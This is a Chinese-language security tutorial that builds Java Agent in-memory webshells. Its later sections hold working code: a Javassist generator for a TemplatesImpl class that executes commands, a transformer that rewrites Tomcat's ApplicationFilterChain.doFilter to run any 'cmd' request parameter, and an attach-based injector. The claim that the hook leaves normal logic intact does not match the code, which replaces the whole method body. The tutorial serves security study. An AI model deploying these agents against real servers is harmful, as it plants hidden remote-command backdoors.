---
title: Java 内存马之 Java Agent 内存马
date: 2026-10-22
---

# Java 内存马之 Java Agent 内存马

## 什么是 Java Agent

Java 是一种静态强类型语言，在运行之前必须先编译成`.class`字节码，然后再交给 JVM 处理运行。Java Agent 就是一种能在不影响正常编译的前提下，修改 Java 字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。

实际上，一些常见的技术比如热部署、诊断工具等都是基于 Java Agent 技术来实现的。那么 Java Agent 技术具体是怎么实现的？

对于 Agent（代理）来说，大致可以分为两种，一种是在 JVM 启动前加载的`premain-Agent`，另一种是 JVM 启动后加载的`agentmain-Agent`。这里我们可以将其理解为一种特殊的拦截器。

**premain-Agent**

![](https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/PreAgent.png)

**agentmain-Agent**

![](https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/agentmain-Agent.png)

## 几种 Java Agent 实例

### premain-Agent

从官方文档中可以知道，首先我们必须实现`premain()`方法，同时我们 jar 文件的清单（manifest）中必须要含有`Premain-Class`属性。

我们可以在命令行利用`-javaagent`来实现启动时加载。

![](https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/premain.png)

`premain()`方法顾名思义，会在我们运行`main()`方法之前进行调用，即在运行`main()`方法之前会去调用我们 jar 包中`Premain-Class`类中的`premain()`方法。

我们先来实现一个简单的`premain-Agent`：

```java
package com.premain.agent;

import java.lang.instrument.Instrumentation;

public class JavaAgentPremain {
    public static void premain(String args, Instrumentation inst){
        for (int i = 0; i < 10; i++) {
            System.out.println("调用了 premain agent");
        }
    }
}
```

然后在`resources/META-INF/`下创建`agent.MF`清单文件用来指定`premain-Agent`的启动类：

```mf
Manifest-Version: 1.0
Premain-Class: com.premain.agent.JavaAgentPremain

```

mvn 编译之后进行打包，并指定启动项，运行结束后将会生成 agent.jar 文件：

```cmd
jar cvfm agent.jar src\main\resources\META-INF\agent.MF -C target\classes .
```

然后按照这个样子继续写个目标类，再直接运行`java -javaagent:agent.jar=Hello -jar hello.jar`即可。

结果就是 agent 中`premain()`的代码被优先执行了。

![](https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/agentSuccess.png)

### agentmain-Agent

相较于`premain-Agent`只能在 JVM 启动前加载，`agentmain-Agent`能够在 JVM 启动之后加载并实现相应的修改字节码功能。下面先了解一下和 JVM 有关的两个类。

#### VirtualMachine 类

`com.sun.tools.attach.VirtualMachine`类可以实现获取 JVM 信息，内存 dump、线程 dump、类信息统计（例如 JVM 加载的类）等功能。

该类允许我们通过`attach()`方法传入一个 JVM 的 PID，来远程连接到该 JVM 上，之后我们就可以对连接的 JVM 进行各种操作，如注入 Agent。下面是该类的主要方法：

```java
//允许我们传入一个JVM的PID，然后远程连接到该JVM上
VirtualMachine.attach()
 
//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理
VirtualMachine.loadAgent()
 
//获得当前所有的JVM列表
VirtualMachine.list()
 
//解除与特定JVM的连接
VirtualMachine.detach()
```

#### VirtualMachineDescriptor 类

`com.sun.tools.attach.VirtualMachineDescriptor`类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如 PID、虚拟机名称等。下面是一个获取特定虚拟机 PID 的实例。

```java
package com.premain.agent;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.util.List;

public class get_PID {
    public static void main(String[] args) {
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for (VirtualMachineDescriptor vmd : list) {
            System.out.println(vmd.id());
        }
    }
}
```

下面实现一个`agentmain-Agent`。首先我们编写一个`Sleep_Hello`类，模拟正在运行的 JVM：

```java
import static java.lang.Thread.sleep;  
  
public class Sleep_Hello {  
    public static void main(String[] args) throws InterruptedException {  
        while (true){  
            System.out.println("Hello World!");  
            sleep(5000);  
        }  
    }  
}
```

然后编写我们的`agentmain-Agent`类：

```java
import java.lang.instrument.Instrumentation;  
  
import static java.lang.Thread.sleep;  
  
public class Java_Agent_agentmain {  
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException {  
        while (true){  
            System.out.println("调用了agentmain-Agent!");  
            sleep(3000);  
        }  
    }  
}
```

然后配置对应的 mf 文件并进行编译打包。编译打包时可以在 pom.xml 中添加内容：

```xml
<build>  
  <plugins>  
    <plugin>  
      <groupId>org.apache.maven.plugins</groupId>  
      <artifactId>maven-assembly-plugin</artifactId>  
      <version>2.6</version>  
      <configuration>  
        <descriptorRefs>  
          <descriptorRef>jar-with-dependencies</descriptorRef>  
        </descriptorRefs>  
        <archive>  
          <manifestFile>  
            src/main/resources/META-INF/MAINFEST.MF  
          </manifestFile>  
        </archive>  
      </configuration>  
    </plugin>  
    <plugin>  
      <groupId>org.apache.maven.plugins</groupId>  
      <artifactId>maven-compiler-plugin</artifactId>  
      <configuration>  
        <source>6</source>  
        <target>6</target>  
      </configuration>  
    </plugin>  
  </plugins>  
</build>
```

然后用`mvn:assembly`进行打包。

然后会获取到两个 jar 包。最后准备一个`Inject`类，将我们的`agentmain`注入目标 JVM：

```java
public class Inject_Agent {  
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {  
        //调用VirtualMachine.list()获取正在运行的JVM列表  
        List<VirtualMachineDescriptor> list = VirtualMachine.list();  
        for(VirtualMachineDescriptor vmd : list){  
            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent  
            if(vmd.displayName().equals("com.solo.Sleep_Hello")){  
  
                //连接指定JVM  
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());  
                //加载Agent  
                virtualMachine.loadAgent("E:\\Coding\\Java\\Java-Agent-Memshell\\Agentmain\\target\\agentdemo-1.0-SNAPSHOT-jar-with-dependencies.jar");  
                //断开JVM连接  
                virtualMachine.detach();  
            }  
  
        }  
    }  
}
```

先运行目标 JVM，再运行`Inject`类进行注入，结果就是一开始只输出`hello,world`，运行`Inject`之后就插入了`agentmain`方法。

### 动态修改字节码

在实现`premain()`的时候，我们除了能获取到`agentArgs`参数，还可以获取`Instrumentation`实例，那么`Instrumentation`实例是什么，在这之前先简单了解一下 Javassist。

#### Javassist

##### 什么是 Javassist

Java 字节码以二进制的形式存储在`.class`文件中，每一个`.class`文件包含一个 Java 类或接口。Javassist 是一个用来处理 Java 字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以通过手动的方式去生成一个新的类对象，其使用方式类似于反射。

##### ClassPool

`ClassPool`是一个`CtClass`对象的容器。`CtClass`对象必须从该对象中获得。如果`get()`在此对象上调用，则它将搜索表示的各种源`ClassPath`以查找类文件，然后创建一个`CtClass`表示该类文件的对象。创建的对象将返回给调用者。可以理解为一个存放`CtClass`对象的容器。

获取方法：`ClassPool cp = ClassPool.getDefault()`。通过`ClassPool.getDefault()`获取的`ClassPool`使用 JVM 的类搜索路径。**如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类**，因为 Web 服务器使用多个类加载器作为系统类加载器。在这种情况下，**ClassPool 必须添加额外的类搜索路径。**

比如：`cp.insertClassPath(new ClassClassPath(<Class>));`。

##### CtClass

可以理解为加强版的 Class 对象，我们可以通过`CtClass`对目标类进行各种操作。可以从`ClassPool.get(ClassName)`中获取。

##### CtMethod

同理，可以理解成加强版的`Method`对象。可通过`CtClass.getDeclaredMethod(MethodName)`获取，该类提供了一些方法以便我们能够直接修改方法体。

```java
public final class CtMethod extends CtBehavior {
    // 主要的内容都在父类 CtBehavior 中
}
 
// 父类 CtBehavior
public abstract class CtBehavior extends CtMember {
    // 设置方法体
    public void setBody(String src);
 
    // 插入在方法体最前面
    public void insertBefore(String src);
 
    // 插入在方法体最后面
    public void insertAfter(String src);
 
    // 在方法体的某一行插入内容
    public int insertAt(int lineNum, String src);
 
}
```

传递给方法`insertBefore()`、`insertAfter()`、`insertAt()`的 String 对象是由 Javassist 的编译器编译的。由于编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义：

![](https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/javassist.png)

##### 使用示例

pom.xml：

```xml
<dependency>  
  <groupId>org.javassist</groupId>  
  <artifactId>javassist</artifactId>  
  <version>3.27.0-GA</version>  
</dependency>
```

测试类：

```java
package javassist;

import java.lang.reflect.Modifier;

public class Javassist_Test {
    public static void Create_Person() throws Exception {

        //获取 CtClass 对象的容器 ClassPool
        ClassPool classPool = ClassPool.getDefault();

        //创建一个新类 Javassist.Learning.Person
        CtClass ctClass = classPool.makeClass("javassist.Person");

        //创建一个类属性 name
        CtField ctField1 = new CtField(classPool.get("java.lang.String"), "name", ctClass);
        //设置属性访问符
        ctField1.setModifiers(Modifier.PRIVATE);
        //将 name 属性添加进 Person 中，并设置初始值
        ctClass.addField(ctField1, CtField.Initializer.constant("solo"));

        //向 Person 类中添加 setter 和 getter
        ctClass.addMethod(CtNewMethod.setter("setName", ctField1));
        ctClass.addMethod(CtNewMethod.getter("getName", ctField1));

        //创建一个无参构造
        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
        //设置方法体
        ctConstructor.setBody("{name = \"solo\";}");
        //向Person类中添加无参构造
        ctClass.addConstructor(ctConstructor);

        //创建一个类方法printName
        CtMethod ctMethod = new CtMethod(CtClass.voidType,"printName", new CtClass[]{}, ctClass);
        //设置方法访问符
        ctMethod.setModifiers(Modifier.PRIVATE);
        //设置方法体
        ctMethod.setBody("{System.out.println(name);}");
        //将该方法添加进Person中
        ctClass.addMethod(ctMethod);

        //将生成的字节码写入文件
        ctClass.writeFile("E:\\Coding\\Java\\Java-Agent-Memshell\\Instrumentation\\src\\main\\java");
    }

    public static void main(String[] args) throws Exception {
        Create_Person();
    }

}

```

生成的 class 文件：

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package javassist;

public class Person {
    private String name = "solo";

    public void setName(String var1) {
        this.name = var1;
    }

    public String getName() {
        return this.name;
    }

    public Person() {
        this.name = "solo";
    }

    private void printName() {
        System.out.println(this.name);
    }
}
```

由此延展的攻击面其实是我们可以利用 Javassist 生成一个恶意的`.class`类，其实在 CC 链的时候也是可以这样打的。

##### 使用 Javassist 生成恶意 class

我们使用`TemplatesImpl`利用链的恶意类来构造：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;
 
public class shell extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
 
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
 
    public shell() throws IOException {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception var2) {
            var2.printStackTrace();
        }
    }
}
```

但是恶意类在执行过程中并没有用到重写的方法，所以我们可以直接使用 Javassist 从字节码层面来生成恶意 class，跳过恶意类的编译过程：

```java
package javassist;  
  
import java.io.File;  
import java.io.FileOutputStream;  
  
public class EvilPayload {  
  
    public static byte[] getTemplatesImpl(String cmd) {  
        try {  
            ClassPool pool = ClassPool.getDefault();  
            CtClass ctClass = pool.makeClass("Evil");  
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");  
            ctClass.setSuperclass(superClass);  
            CtConstructor constructor = ctClass.makeClassInitializer();  
            constructor.setBody(" try {\n" +  
                    " Runtime.getRuntime().exec(\"" + cmd +  
                    "\");\n" +  
                    " } catch (Exception ignored) {\n" +  
                    " }");  
            byte[] bytes = ctClass.toBytecode();  
            ctClass.defrost();  
            return bytes;  
        } catch (Exception e) {  
            e.printStackTrace();  
            return new byte[]{};  
        }  
    }  
  
  
    public static void writeShell() throws Exception {  
        byte[] shell = EvilPayload.getTemplatesImpl("Calc");  
        FileOutputStream fileOutputStream = new FileOutputStream(new File("S"));  
        fileOutputStream.write(shell);  
    }  
  
    public static void main(String[] args) throws Exception {  
        writeShell();  
    }  
}
```

生成的恶意文件被输出到`S`这个文件中，反编译出来的代码：

```java
//  
// Source code recreated from a .class file by IntelliJ IDEA  
// (powered by FernFlower decompiler)  
//  
  
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
  
public class Evil extends AbstractTranslet {  
    static {  
        try {  
            Runtime.getRuntime().exec("Calc");  
        } catch (Exception var1) {  
        }  
  
    }  
  
    public Evil() {  
    }  
}
```

#### Instrumentation

`Instrumentation`是 JVMTI Agent（JVM Tool Interface Agent）的一部分，Java Agent 通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。

它在 Java 中是一个接口，常用方法如下：

```java
public interface Instrumentation {
    
    //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。
    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);
 
    //在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。
    void addTransformer(ClassFileTransformer transformer);
 
    //删除一个类转换器
    boolean removeTransformer(ClassFileTransformer transformer);
 
 
    //在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。
    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;
 
 
 
    //判断一个类是否被修改
    boolean isModifiableClass(Class<?> theClass);
 
    // 获取目标已经加载的类。
    @SuppressWarnings("rawtypes")
    Class[] getAllLoadedClasses();
 
    //获取一个对象的大小
    long getObjectSize(Object objectToSize);
 
}
```

##### ClassFileTransformer

转换类文件，该接口下之后一个方法：`transform()`，重写该方法即可转换任意类文件，并返回新的被取代的类文件，在 Java Agent 内存马中便是在该方法下重写恶意代码，从而修改原有类文件代码逻辑，与`addtransformer()`搭配使用。

```java
//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。  
void addTransformer(ClassFileTransformer transformer, boolean canRetransform);
```

##### 获取目标 JVM 已加载类

```java
public class Sleep_Hello {  
    public static void main(String[] args) throws InterruptedException {  
        while(true) {  
            hello();  
            sleep(3000);  
        }  
    }  
    public static void hello(){  
        System.out.println("Hello World!");  
    }  
}
```

Agent 主类：

```java
public class agentmain_transform {  
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException {  
        Class [] classes = inst.getAllLoadedClasses();  
  
        //获取目标JVM加载的全部类  
        for(Class cls : classes){  
            if (cls.getName().equals("AgentShell.Sleep_Hello")){  
  
                //添加一个transformer到Instrumentation，并重新触发目标类加载  
                inst.addTransformer(new Hello_Transform(),true);  
                inst.retransformClasses(cls);  
            }  
        }  
    }  
}
```

Transformer 修改类：

```java
public class Hello_Transform implements ClassFileTransformer {  
  
    @Override  
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {  
        try {  
  
            //获取CtClass 对象的容器 ClassPool            
            ClassPool classPool = ClassPool.getDefault();  
  
            //添加额外的类搜索路径  
            if (classBeingRedefined != null) {  
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);  
                classPool.insertClassPath(ccp);  
            }  
  
            //获取目标类  
            CtClass ctClass = classPool.get("AgentShell.Sleep_Hello");  
            System.out.println(ctClass);  
  
            //获取目标方法  
            CtMethod ctMethod = ctClass.getDeclaredMethod("hello");  
  
            //设置方法体  
            String body = "{System.out.println(\"Hacker!\");}";  
            ctMethod.setBody(body);  
  
            //返回目标类字节码  
            byte[] bytes = ctClass.toBytecode();  
            return bytes;  
  
        }catch (Exception e){  
            e.printStackTrace();  
        }  
        return null;  
    }  
}
```

完毕之后打包 Java Agent 包，`MAINFEST.MF`进行修改：

```mf
Manifest-Version: 1.0  
Agent-Class: AgentShell.agentmain_transform  
Can-Redefine-Classes: true  
Can-Retransform-Classes: true
```

最后是写动态注入 Agent 的注入类：

```java
public class Inject_Agent {  
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException {  
        //调用VirtualMachine.list()获取正在运行的JVM列表  
        List<VirtualMachineDescriptor> list = VirtualMachine.list();  
        for(VirtualMachineDescriptor vmd : list){  
            System.out.println(vmd.displayName());  
            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent  
            if(vmd.displayName().equals("AgentShell.Sleep_Hello")){  
  
                //连接指定JVM  
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());  
                //加载Agent  
                virtualMachine.loadAgent("E:\\Coding\\Java\\Java-Agent-Memshell\\Instrumentation\\target\\Instrumentation-1.0-SNAPSHOT-jar-with-dependencies.jar");  
                //断开JVM连接  
                virtualMachine.detach();  
            }  
  
        }  
    }  
}
```

### Instrumentation 的局限性

大多数情况下，我们使用`Instrumentation`都是使用其字节码插桩的功能，简单来说就是类重定义功能，但是有局限性：

- `premain`和`agentmain`两种方法修改字节码的时机都是类文件加载之后，也就是说必须带有 Class 类型的参数，不能通过字节码文件和自定义类名重新定义一个本来不存在的类。
- 类的字节码修改称为类转换（Class Transform），类转换其实最终都回归到类重定义`Instrumentation#redefineClasses`方法，这个方法有一下限制：
  - 新类和老类的父类必须相同
  - 新类和老类实现的接口也要相同
  - 新类和老类访问符必须一致，字段数和字段名要一致
  - 新类和老类新增或删除的方法必须是`private static/final`修饰的
  - 可以修改方法体

## Agent 内存马

比如我们起一个 Springboot 的服务，由于 Tomcat 的责任链机制，会按照责任链机制反复调用`ApplicationFilterChain#doFilter()`方法：

```java
public void doFilter(ServletRequest request, ServletResponse response)
        throws IOException, ServletException {
 
        if( Globals.IS_SECURITY_ENABLED ) {
            final ServletRequest req = request;
            final ServletResponse res = response;
            try {
                java.security.AccessController.doPrivileged(
                        (java.security.PrivilegedExceptionAction<Void>) () -> {
                            internalDoFilter(req,res);
                            return null;
                        }
                );
            } ...
            }
        } else {
            internalDoFilter(request,response);
        }
    }
```

跟进到`internalDoFilter()`方法中：

```java
private void internalDoFilter(ServletRequest request,
                                  ServletResponse response)
        throws IOException, ServletException {
 
        // Call the next filter if there is one
        if (pos < n) {
            ...
        }
}
```

这两个方法都有`ServletRequest`和`ServletResponse`，且 Hook 不会影响正常的业务逻辑，因此很适合作为内存马的回显。

### Java Agent 实现 Spring Filter 内存马

复用上面的`agentmain`，修改字节码的关键在于`transform()`方法，因此我们重写该方法即可：

```java
public class Filter_Transform implements ClassFileTransformer {  
    @Override  
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {  
        try {  
  
            //获取CtClass 对象的容器 ClassPool            
            ClassPool classPool = ClassPool.getDefault();  
  
            //添加额外的类搜索路径  
            if (classBeingRedefined != null) {  
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);  
                classPool.insertClassPath(ccp);  
            }  
  
            //获取目标类  
            CtClass ctClass = classPool.get("org.apache.catalina.core.ApplicationFilterChain");  
  
            //获取目标方法  
            CtMethod ctMethod = ctClass.getDeclaredMethod("doFilter");  
  
            //设置方法体  
            String body = "{" +  
                    "javax.servlet.http.HttpServletRequest request = $1\n;" +  
                    "String cmd=request.getParameter(\"cmd\");\n" +  
                    "if (cmd !=null){\n" +  
                    "  Runtime.getRuntime().exec(cmd);\n" +  
                    "  }"+  
                    "}";  
            ctMethod.setBody(body);  
  
            //返回目标类字节码  
            byte[] bytes = ctClass.toBytecode();  
            return bytes;  
  
        }catch (Exception e){  
            e.printStackTrace();  
        }  
        return null;  
    }  
}
```

修改`MAINFEST.MF`配置以及 Agent 主类代码：

```java
public class agentmain_transform {  
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException {  
        Class [] classes = inst.getAllLoadedClasses();  
  
        //获取目标JVM加载的全部类  
        for(Class cls : classes){  
            if (cls.getName().equals("org.apache.catalina.core.ApplicationFilterChain")){  
  
                //添加一个transformer到Instrumentation，并重新触发目标类加载  
                inst.addTransformer(new Filter_Transform(),true);  
                inst.retransformClasses(cls);  
            }  
        }  
    }  
}
```

```mf
Manifest-Version: 1.0  
Agent-Class: com.drunkbaby.agentmain_transform
Can-Redefine-Classes: true  
Can-Retransform-Classes: true

```

然后准备注入类：

```java
public class Inject_Agent {  
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException {  
        //调用VirtualMachine.list()获取正在运行的JVM列表  
        List<VirtualMachineDescriptor> list = VirtualMachine.list();  
        for(VirtualMachineDescriptor vmd : list){  
            System.out.println(vmd.displayName());  
            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent  
            if(vmd.displayName().contains("JavaAgentSpringBootApplication")){  
  
                //连接指定JVM  
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());  
                //加载Agent  
                virtualMachine.loadAgent("E:\\Coding\\Java\\JavaSecurityLearning\\JavaSecurity\\MemoryShell\\Java-Agent-Memshell\\AgentInjectionExample\\target\\AgentInjectionExample-1.0-SNAPSHOT-jar-with-dependencies.jar");  
                //断开JVM连接  
                virtualMachine.detach();  
            }  
  
        }  
    }  
}
```

## 总结

对比传统的 Tomcat 内存马，Agent 内存马在实现形式上还是打 Tomcat 内存马，然而实现角度是遍历所有 JVM 进程，然后向进程中注入对应的 Agent 类，在 Agent 类中通过`ClassPool`生成恶意代码。

































